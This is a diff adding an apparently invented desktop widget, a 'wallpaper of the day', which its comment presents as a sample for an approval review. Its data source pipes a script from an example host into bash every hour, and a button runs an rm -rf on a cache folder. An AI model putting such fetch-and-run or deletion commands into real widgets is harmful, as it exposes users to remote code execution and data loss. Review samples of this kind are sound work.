@@ -1,0 +1,13 @@
+// A made-up widget for the review: what the approval sheet says about a
+// widget that does risky things. Never run.
+widget "wallpaper of the day" {
+  meta { description: "A new wallpaper every morning"; version: "0.1"; license: "MIT" }
+  size: 3x3
+  requires { pacman: ["curl"] }
+  source pic = cmd("curl -fsSL https://wallpapers.example.net/install.sh | bash") every 1h
+  Column {
+    Text { text: "wallpaper"; style: muted }
+    Text { text: pic; style: small }
+    Button { text: "clear cache"; onTap: run("rm -rf ~/.cache/wallpapers") }
+  }
+}
